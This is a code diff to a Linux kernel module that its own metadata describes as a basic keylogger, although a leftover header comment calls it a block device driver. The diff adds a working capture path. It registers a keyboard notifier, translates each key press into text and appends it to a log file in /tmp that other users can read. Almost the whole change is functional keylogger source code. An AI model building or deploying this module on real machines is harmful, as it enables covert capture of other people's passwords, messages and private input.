@@ -2,32 +2,12 @@
  *    PURPOSE - A block device driver for a virtual block device of my own creation
  */
 
-/////////////
-/* HEADERS */
-/////////////
-// Do not change the order of these includes unless you want:
-// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
-#include <asm/current.h>                        // current
-#include <linux/cred.h>                         // ???
-
-#include <asm/uaccess.h>                        // get_fs(), set_fs()
-#include "HarkleKerror.h"                       // Kernel error macros
-#include <linux/fcntl.h>                        // filp_open(), filp_close()
-#include <linux/interrupt.h>                    // irq_handler_t
-#include <linux/fs.h>                           // Defines file table structures
-#include <linux/kernel.h>                       // ALWAYS NEED
-#include <linux/module.h>                       // ALWAYS NEED
-#include <linux/stat.h>                         // File mode macros
-
 ////////////
 /* MACROS */
 ////////////
 
 // GENERAL //
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
-// #define HARKLE_KERROR(module, funcName, errMsg) do { printk(KERN_ERR "%s: <<<ERROR>>> %s - %s\n", module, #funcName, errMsg); } while (0);
-// #define HARKLE_KERRNO(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
-// #define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
 #define BUFF_SIZE 16                           // Size of the out buffer
 #ifndef TRUE
 #define TRUE 1
@@ -39,12 +19,11 @@
 // LOGGING //
 #define DEF_LOG_FILENAME "/tmp/myKeyLog.txt"
 #define DEF_LOG_FLAGS O_WRONLY | O_CREAT | O_APPEND
-// #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH
 #define DEF_LOG_PERMS S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
 #define DEF_LOG_INIT_MSG "***INITIALIZING LOG***\n"
 #define DEF_LOG_CLOSE_MSG "\n***CLOSING LOG***\n"
 
-#define SOLUTION 1
+#define SOLUTION 2
 #if SOLUTION == 1
 // SOLUTION #1 - ISR4IRQ
 // Intel-specific magic numbers
@@ -54,6 +33,28 @@
 #define KBD_DATA_REG 0x60
 #else
 // Placeholder SOLUTION 2
+#endif  // SOLUTION
+
+/////////////
+/* HEADERS */
+/////////////
+// Do not change the order of these includes unless you want:
+// ./arch/x86/include/asm/uaccess.h:28:26: error: dereferencing pointer to incomplete type ‘struct task_struct’
+#include <asm/current.h>                        // current
+#include <linux/cred.h>                         // ???
+
+#include <asm/uaccess.h>                        // get_fs(), set_fs()
+#include "HarkleKerror.h"                       // Kernel error macros
+#include <linux/fcntl.h>                        // filp_open(), filp_close()
+#include <linux/fs.h>                           // Defines file table structures
+#include <linux/kernel.h>                       // ALWAYS NEED
+#include <linux/module.h>                       // ALWAYS NEED
+#include <linux/stat.h>                         // File mode macros
+
+#if SOLUTION == 1
+#include <linux/interrupt.h>                    // irq_handler_t
+#else
+#include <linux/keyboard.h>                     // register_keyboard_notifier(), unregister_keyboard_notifier()
 #endif  // SOLUTION
 
 //////////////
@@ -93,7 +94,8 @@ void tasklet_logger(unsigned long data);
 // Likely because this macro expands to another function prototype.
 DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
 #else
-// Placeholder SOLUTION 2
+// PURPOSE - Respond to a key press notification
+int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param);
 #endif  // SOLUTION
 
 /////////////
@@ -101,7 +103,12 @@ DECLARE_TASKLET(my_tasklet, tasklet_logger, 0);  // SOLUTION #1 - ISR4IRQ
 /////////////
 myKeyLogger myKL;
 int shift;
+#if SOLUTION == 1
 unsigned char sCode;  // SOLUTION #1 - ISR4IRQ
+#else
+// Register this with the keyboard driver
+static struct notifier_block kl_notif_block = { .notifier_call = kl_module };
+#endif  // SOLUTION
 
 //////////////////////////
 /* FUNCTION DEFINITIONS */
@@ -178,7 +185,12 @@ static int __init key_logger_init(void)
             HARKLE_KERROR(DEVICE_NAME, key_logger_init, "request_irq() failed to register a shared IRQ handler");  // DEBUGGING
         }
 #else
-// Placeholder SOLUTION 2
+        /*
+         * Add to the list of console keyboard event
+         * notifiers so the callback is
+         * called when an event occurs.
+         */
+        register_keyboard_notifier(&kl_notif_block);
 #endif  // SOLUTION
     }
     
@@ -202,7 +214,7 @@ static void __exit key_logger_exit(void)
     // Free the shared IRQ handler, giving system back original control.
     free_irq(KEYBOARD_IRQ, &sCode);
 #else
-// Placeholder SOLUTION 2
+    unregister_keyboard_notifier(&kl_notif_block);
 #endif  // SOLUTION
 
     // Close Key Logging File
@@ -416,7 +428,80 @@ void tasklet_logger(unsigned long data)
     return;
 }
 #else
-// Placeholder SOLUTION 2
+int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_param)
+{
+    // LOCAL VARIABLES
+    int retVal = 0;
+    int msgLen = 0;  // Length of human readable string from converted scan code
+    struct keyboard_notifier_param *param = _param;
+    int tempRetVal = 0;  // translate_code() return value
+
+    if (!notifBlock || !_param)
+    {
+        retVal = NOTIFY_BAD;
+        HARKLE_KERROR(DEVICE_NAME, kl_module, "NULL pointer");  // DEBUGGING
+    }
+    else if (!(param->down))
+    {
+        retVal = NOTIFY_OK;  // We don't care unless a key is being pressed down
+    }
+    // NOTES
+    // 1. I'm sure about the differences between KBD_KEYCODE, KBD_UNBOUND_KEYCODE, KBD_KEYSYM, and KBD_POST_KEYSYM
+    // but I'm seeing all four values come through in the "code" parameter
+    // 2. Observation tells me I only want the KBD_KEYCODE codes (whatever those are)
+    // 3. Not a lot of information to find on the matter but I found the macros here:
+    // https://elixir.bootlin.com/linux/latest/source/include/linux/notifier.h
+    else if (KBD_KEYCODE == code)
+    {
+        // printk(KERN_DEBUG "%s: code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n", DEVICE_NAME, code, param->down, param->shift, param->value);  // DEBUGGING
+
+        // 0. Set shift key
+        if (param->shift)
+        {
+            shift = 1;
+        }
+        else
+        {
+            shift = 0;
+        }
+
+        // 1. Convert data to string
+        tempRetVal = translate_code(param->value, myKL.keyStr);
+
+        if (-1 == tempRetVal)
+        {
+            HARKLE_KERROR(DEVICE_NAME, kl_module, "translate_code() has failed");  // DEBUGGING
+        }
+        else if (0 == tempRetVal)
+        {
+            // 2. Write string to log file
+            msgLen = strlen(myKL.keyStr);
+
+            // NOTES:
+            //  - msgLen > 0 avoids empty strings (due to unsupported values)
+            //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
+            if (msgLen > 0 && myKL.log_fp)
+            {
+                if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
+                {
+                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
+                }
+            }
+        }
+        else
+        {
+            // Unsupported value
+            // printk(KERN_DEBUG "%s: Skipping unsupported value of %u\n", DEVICE_NAME, param->value);  // DEBUGGING
+        }
+    }
+    else
+    {
+        // We don't want this event, whatever it is
+        // printk(KERN_DEBUG "%s: Skipping event 0x%lx", DEVICE_NAME, code);  // DEBUGGING
+    }
+
+    return retVal;
+}
 #endif  // SOLUTION
 
 static int translate_code(unsigned char scanCode, char *buf)
@@ -625,7 +710,4 @@ module_exit(key_logger_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Joseph 'Makleford' Harkleroad");
 MODULE_DESCRIPTION("A basic key logging Linux Kernel Module");
-MODULE_VERSION("0.1"); // Not yet releasable
-
-// unsigned char inb(unsigned short int port)
-// https://www.systutorials.com/docs/linux/man/1-inb/
+MODULE_VERSION("0.2"); // Not yet releasable
